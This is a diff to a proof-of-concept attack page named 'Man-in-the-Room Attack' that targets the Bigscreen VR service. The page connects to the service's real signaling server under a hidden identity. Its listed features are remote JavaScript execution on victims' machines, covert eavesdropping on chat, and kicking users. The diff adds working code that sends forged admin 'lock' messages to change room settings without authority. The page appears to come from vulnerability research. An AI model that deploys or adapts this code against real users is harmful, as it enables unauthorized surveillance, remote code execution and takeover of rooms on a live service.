@@ -1,3 +1,8 @@
+<!--
+
+ WARNING: This source code was developed as proof-of-concept and is NOT production-ready!
+
+ -->
 <!doctype html>
 <html lang="en">
   <head>
@@ -16,12 +21,18 @@
         <div class="col-sm">
             <h1>Man-in-the-Room Attack <small class="text-muted">Proof of Concept</small></h1>
             <h2>Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
-            <div class="alert alert-success" role="alert">
+            <div class="alert alert-secondary alert-dismissible fade show" role="alert">
                 <p class="h3 alert-heading">Features</p>
                 <ul>
-                    <li>Attacker's username is hidden from <i>Room Preview UI</i> and from <i>Room Participants UI</i>. Attacker is not visible in VR room.</li>
+                    <li>Remote <abbr title="Read–Eval–Print Loop" class="initialism">REPL</abbr> (remote Javascript <code>eval</code>) on victim's machines.</li>
+                    <li>Attacker is not visible in VR room. Attacker's username is hidden from <i>Room Preview UI</i> and from <i>Room Participants UI</i>.</li>
                     <li>Victim's chat is persistently eavesdropped, even if they go to another room.</li>
+                    <li>Kick users from rooms. <i>Only admin should be able to do this.</i></li>
+                    <li>Change room's settings (VR locks). <i>Only admin should be able to do this.</i></li>
                 </ul>
+                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
             </div>
             <form class="form-inline" id="joinRoomForm">
                 <label class="mb-2 mr-sm-2" for="roomIdInput">Room ID: </label>
@@ -47,6 +58,12 @@
 <script src="./msgpack.min.js"></script>
 <script>
 'use strict';
+
+/**
+ *
+ * WARNING: This source code was developed as proof-of-concept and is NOT production-ready!
+ *
+ */
 
 const bigscreenSignalUrl = 'wss://signal2.bigscreenvr.com';
 const textName = '__Mallory__';
@@ -247,8 +264,13 @@ function RoomParticipant(identity, room, userId){
         '                <h6 class="_uuid card-subtitle mb-2 text-muted"></h6>\n' +
         '                <p class="card-text"></p>\n' +
         '                <div class="btn-group" role="group">\n' +
-        '                  <button class="btn btn-primary" type="button" data-toggle="collapse" data-target="#repl'+this.room.roomId+this.userId+'">REPL</button>\n' +
-        '                  <button class="_kick btn btn-danger" type="button" >Kick</button>\n' +
+        '                <button class="btn btn-primary" type="button" data-toggle="collapse" data-target="#repl'+this.room.roomId+this.userId+'">' +
+        '                   <b class="icon">📡</b>' +
+        '                   REPL</button>\n' +
+        '                <button class="_kick btn btn-danger" type="button" >' +
+        '                   <b class="icon">👋</b>' +
+        '                   Kick' +
+        '                </button>\n' +
         '                </div>\n' +
         '                <div class="collapse" id="repl'+this.room.roomId+this.userId+'">\n' +
         '                    <div class="card card-body p-0">\n' +
@@ -336,11 +358,35 @@ joinRoomForm.addEventListener("submit", function (event) {
     room.join();
 });
 
-function RoomUI(roomId){
+function RoomUI(roomId, room){
+    let that = this;
+    this.room = room;
     let roomCardTempalte = document.createElement('template');
     roomCardTempalte.innerHTML =
         '<div class="card">\n' +
-        '    <div class="card-header"></div>\n' +
+        '    <div class="card-header">' +
+        '       <span></span>' +
+        '       <div class="dropdown display-inline-block">\n' +
+        '           <button class="btn btn-info dropdown-toggle" type="button" data-toggle="dropdown">' +
+        '               <b class="icon">⚙</b>' +
+        '               Settings' +
+        '           </button>\n' +
+        '           <div class="dropdown-menu">\n' +
+        '               <button class="_lockBigscreen dropdown-item text-white" type="button">\n' +
+        '                   <b class="icon">🔓</b><b>Lock the big screen</b><br/>\n' +
+        '                   Avoid interruptions when watching movies on the big screen.<br/> Prevent users from changing the big screen.\n' +
+        '               </button>\n' +
+        '               <button class="_lockDesktopAudio dropdown-item text-white" type="button">\n' +
+        '                   <b class="icon">🔓</b><b>Lock desktop audio streaming</b><br/>\n' +
+        '                   Prevent anyone from broadcasting a new Desktop Audio stream to the room.\n' +
+        '               </button>\n' +
+        '               <button class="_lockDrawing dropdown-item text-white" type="button">\n' +
+        '                   <b class="icon">🔓</b><b>Lock 3D Drawing markers</b><br/>\n' +
+        '                   Prevent anyone from using 3D markers to draw in your room.\n' +
+        '               </button>\n' +
+        '           </div>\n' +
+        '       </div>' +
+        '    </div>\n' +
         '    <div class="card-body">\n' +
         '        <div class="row">\n' +
         '            <div class="col-6 col-sm-4">\n' +
@@ -358,11 +404,85 @@ function RoomUI(roomId){
         '</div>';
     this.roomCardElement = roomCardTempalte.content.firstChild;
 
-    this.roomIdElement = this.roomCardElement.querySelector('.card-header');
+    this.lockElements = {
+        lockBigscreenButton: this.roomCardElement.querySelector('._lockBigscreen'),
+        lockDesktopAudioButton:  this.roomCardElement.querySelector('._lockDesktopAudio'),
+        lockDrawingButton: this.roomCardElement.querySelector('._lockDrawing'),
+    };
+    this.lockElements.lockBigscreenButton.addEventListener("click", function (event) {
+        let locks = that.room.locks;
+        locks.lockBigscreen = ! locks.lockBigscreen;
+        that.room.updateLockSettings(locks);
+    });
+    this.lockElements.lockDesktopAudioButton.addEventListener("click", function (event) {
+        let locks = that.room.locks;
+        locks.lockDesktopAudio = ! locks.lockDesktopAudio;
+        that.room.updateLockSettings(locks);
+    });
+    this.lockElements.lockDrawingButton.addEventListener("click", function (event) {
+        let locks = that.room.locks;
+        locks.lockDrawing = ! locks.lockDrawing;
+        that.room.updateLockSettings(locks);
+    });
+
+    this.roomIdElement = this.roomCardElement.querySelector('.card-header span');
     this.roomIdElement.appendChild(document.createTextNode(roomId));
 
     this.chatBodyElement = this.roomCardElement.querySelector('div div div div div.card-body');
     this.participantsElement = this.roomCardElement.querySelector('div div div div.row');
+
+    this.updateLockSettings = function(locks){
+        if(locks.lockBigscreen) {
+            this.lockElements.lockBigscreenButton.classList.remove('bg-danger');
+            this.lockElements.lockBigscreenButton.classList.add('bg-success');
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔒')
+            );
+        }
+        else{
+            this.lockElements.lockBigscreenButton.classList.add('bg-danger');
+            this.lockElements.lockBigscreenButton.classList.remove('bg-success');
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockBigscreenButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔓')
+            );
+        }
+
+        if(locks.lockDesktopAudio) {
+            this.lockElements.lockDesktopAudioButton.classList.remove('bg-danger');
+            this.lockElements.lockDesktopAudioButton.classList.add('bg-success');
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔒')
+            );
+        }
+        else{
+            this.lockElements.lockDesktopAudioButton.classList.add('bg-danger');
+            this.lockElements.lockDesktopAudioButton.classList.remove('bg-success');
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDesktopAudioButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔓')
+            );
+        }
+
+        if(locks.lockDrawing) {
+            this.lockElements.lockDrawingButton.classList.remove('bg-danger');
+            this.lockElements.lockDrawingButton.classList.add('bg-success');
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔒')
+            );
+        }
+        else{
+            this.lockElements.lockDrawingButton.classList.add('bg-danger');
+            this.lockElements.lockDrawingButton.classList.remove('bg-success');
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].innerHTML = '';
+            this.lockElements.lockDrawingButton.getElementsByTagName('b')[0].appendChild(
+                document.createTextNode('🔓')
+            );
+        }
+    };
 
     this.render = function(parentElement){
         parentElement.appendChild(this.roomCardElement);
@@ -402,6 +522,8 @@ function Room(roomId, attackerIdentity){
     this.category = null;
     this.environment = null;
     this.version = null;
+
+    this.locks = null;
 
     this.lastUpdated = null;
 
@@ -484,6 +606,22 @@ function Room(roomId, attackerIdentity){
         });
     };
 
+    this.updateLockSettings = function(locks){
+        this.roomUI.updateLockSettings(locks);
+
+        this.sendSignalingMessage({
+          type: 'admin',
+          action: 'lock',
+          roomId: this.roomId,
+          msg: [
+            (locks.lockBigscreen ? '' : 'un') + 'lock-bigscreen',
+            (locks.lockDesktopAudio ? '' : 'un') + 'lock-desktopaudio',
+            (locks.lockDrawing ? '' : 'un') + 'lock-drawing',
+            (locks.lockMicrophones ? '' : 'un') + 'lock-microphones'
+          ]
+        });
+    };
+
     /**
      * Join room. Connect to signaling server and establish WebRTC channels
      * with other room participants.
@@ -495,7 +633,7 @@ function Room(roomId, attackerIdentity){
         this.signalingWs.onopen = function (event) {
             console.log('connected', event);
 
-            let roomUI = new RoomUI(roomId);
+            let roomUI = new RoomUI(roomId, that);
             roomUI.render(roomsElement);
             that.roomUI = roomUI;
             for (let userId in that.roomParticipants){
@@ -540,8 +678,23 @@ function Room(roomId, attackerIdentity){
                 console.log(`Participant ${message.userId} left room ${this.roomId}.`);
                 break;
             }
+            case "admin": {
+                if(message.action === 'lock'){
+                    this.locks = {
+                        lockBigscreen: message.msg.includes('lock-bigscreen'),
+                        lockDesktopAudio: message.msg.includes('lock-desktopaudio'),
+                        lockDrawing: message.msg.includes('lock-drawing'),
+                        lockMicrophones: message.msg.includes('lock-microphones'),
+                    };
+                    this.roomUI.updateLockSettings(this.locks);
+                    console.log('updated locks', this.locks);
+                }
+                else{
+                    console.error('unexpected action of message', message);
+                }
+                break;
+            }
             case "room-latest":
-            case "admin":
             case "linkedpc-joined":
             case "linkedpc-left":
             case "party-join":
